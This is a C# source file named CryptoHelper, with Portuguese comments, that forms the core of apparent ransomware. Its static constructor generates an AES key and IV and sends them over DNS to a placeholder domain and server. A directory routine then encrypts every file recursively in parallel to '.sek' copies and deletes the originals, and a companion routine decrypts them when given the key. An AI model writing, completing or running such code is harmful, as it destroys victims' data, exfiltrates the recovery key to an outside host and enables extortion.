using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using Dns;

namespace Crypto
{
    public static class CryptoHelper
    {
        private static string _base64IV;
        private static string _base64Key;
        private static readonly int MaxWorkers = Environment.ProcessorCount * 2;

        /// <summary>
        /// Static constructor to initialize IV and Key.
        /// </summary>
        static CryptoHelper()
        {
            _base64IV = GenerateIV();
            _base64Key = GenerateKey();
            string subdomain = "abc123"; // Gere um identificador único
            string domain = "exemplo.com";
            string dnsServer = "ip.ip.ip.ip:53";
            try
            {
                DNSHelper.SendKeyAndIV(subdomain, _base64Key, _base64IV, domain, dnsServer);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Aviso: Falha ao enviar chave/IV via DNS:{ex.Message}"); 
            }
        }

        /// <summary>
        /// Generates a 16-byte base64 encoded IV.
        /// </summary>
        public static string GenerateIV()
        {
            byte[] iv = new byte[16];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(iv);
            }
            return Convert.ToBase64String(iv);
        }

        /// <summary>
        /// Generates a 32-byte base64 encoded encryption key.
        /// </summary>
        public static string GenerateKey()
        {
            byte[] key = new byte[32];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(key);
            }
            return Convert.ToBase64String(key);
        }

        /// <summary>
        /// Encrypts a file with AES256 using the provided IV and key.
        /// </summary>
        public static void Encrypt(string filePath, string base64IV, string base64Key)
        {
            byte[] key = Convert.FromBase64String(base64Key);
            byte[] iv = Convert.FromBase64String(base64IV);

            byte[] fileContent = File.ReadAllBytes(filePath);

            using (var aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CFB;
                aes.Padding = PaddingMode.None;
                aes.FeedbackSize = 8;

                using (var encryptor = aes.CreateEncryptor())
                using (var ms = new MemoryStream())
                {
                    using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        cs.Write(fileContent, 0, fileContent.Length);
                    }
                    File.WriteAllBytes(filePath + ".sek", ms.ToArray());
                }
            }
        }

        /// <summary>
        /// Encrypts a file with a generated IV and key.
        /// </summary>
        public static void EncryptFile(string filePath)
        {
            Encrypt(filePath, _base64IV, _base64Key);
        }

        /// <summary>
        /// Deletes a file at the specified path.
        /// </summary>
        public static void DeleteFile(string path)
        {
            try
            {
                File.Delete(path);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
                throw;
            }
        }

        /// <summary>
        /// Decrypts a file with AES256 using the provided IV and key.
        /// </summary>
        public static void Decrypt(string filePath, string argumentIV, string argumentKey)
        {
            byte[] key = Convert.FromBase64String(argumentKey);
            byte[] iv = Convert.FromBase64String(argumentIV);

            if (!File.Exists(filePath))
                return;

            byte[] encryptedContent = File.ReadAllBytes(filePath);

            using (var aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CFB;
                aes.Padding = PaddingMode.None;
                aes.FeedbackSize = 8;

                string fileName = filePath.Substring(0, filePath.Length - 4);

                using (var decryptor = aes.CreateDecryptor())
                using (var ms = new MemoryStream())
                {
                    using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Write))
                    {
                        cs.Write(encryptedContent, 0, encryptedContent.Length);
                    }
                    File.WriteAllBytes(fileName, ms.ToArray());
                }
            }
        }

        /// <summary>
        /// Decrypts a file if it has the .sek extension.
        /// </summary>
        public static void DecryptFile(string filePath, string argumentIV, string argumentKey)
        {
            string extension = Path.GetExtension(filePath);
            if (extension == ".sek")
            {
                Decrypt(filePath, argumentIV, argumentKey);
            }
        }

        /// <summary>
        /// Encrypts all files in a directory concurrently.
        /// </summary>
        public static void EncryptFilesInDirectory(string directoryPath)
        {
            Console.WriteLine($"IV: {_base64IV}");
            Console.WriteLine($"Key: {_base64Key}");

            var files = Directory.GetFiles(directoryPath, "*", SearchOption.AllDirectories).ToList();

            ProcessFilesConcurrently(files, EncryptWorker);
        }

        /// <summary>
        /// Decrypts all .sek files in a directory concurrently.
        /// </summary>
        public static void DecryptFilesInDirectory(string directoryPath, string argumentIV, string argumentKey)
        {
            var files = Directory.GetFiles(directoryPath, "*.sek", SearchOption.AllDirectories).ToList();

            ProcessFilesConcurrentlyWithArgs(files, argumentIV, argumentKey, DecryptWorker);
        }

        /// <summary>
        /// Worker function for encryption.
        /// </summary>
        private static Exception EncryptWorker(string filePath)
        {
            try
            {
                EncryptFile(filePath);
                DeleteFile(filePath);
                return null;
            }
            catch (Exception ex)
            {
                return new Exception($"failed to encrypt {filePath}: {ex.Message}");
            }
        }

        /// <summary>
        /// Worker function for decryption.
        /// </summary>
        private static Exception DecryptWorker(string filePath, string argumentIV, string argumentKey)
        {
            try
            {
                DecryptFile(filePath, argumentIV, argumentKey);
                DeleteFile(filePath);
                return null;
            }
            catch (Exception ex)
            {
                return new Exception($"failed to decrypt {filePath}: {ex.Message}");
            }
        }

        /// <summary>
        /// Processes files concurrently for encryption with limited parallelism.
        /// </summary>
        private static void ProcessFilesConcurrently(List<string> files, Func<string, Exception> worker)
        {
            var results = new ConcurrentBag<Exception>();

            Parallel.ForEach(files, new ParallelOptions { MaxDegreeOfParallelism = MaxWorkers }, file =>
            {
                var result = worker(file);
                if (result != null)
                    results.Add(result);
            });

            var errors = results.Where(e => e != null).ToList();
            if (errors.Count > 0)
                throw new AggregateException("One or more files failed to process.", errors);
        }

        /// <summary>
        /// Processes files concurrently for decryption with additional arguments and limited parallelism.
        /// </summary>
        private static void ProcessFilesConcurrentlyWithArgs(List<string> files, string argumentIV, string argumentKey, Func<string, string, string, Exception> worker)
        {
            var results = new ConcurrentBag<Exception>();

            Parallel.ForEach(files, new ParallelOptions { MaxDegreeOfParallelism = MaxWorkers }, file =>
            {
                var result = worker(file, argumentIV, argumentKey);
                if (result != null)
                    results.Add(result);
            });

            var errors = results.Where(e => e != null).ToList();
            if (errors.Count > 0)
                throw new AggregateException("One or more files failed to process.", errors);
        }

        /// <summary>
        /// Walks a directory and collects all file paths.
        /// </summary>
        public static void WalkDir(string root, ref List<string> files)
        {
            try
            {
                var allFiles = Directory.GetFiles(root, "*", SearchOption.AllDirectories);
                files.AddRange(allFiles);
            }
            catch (Exception ex)
            {
                throw new Exception($"Error walking directory {root}: {ex.Message}");
            }
        }
    }
}
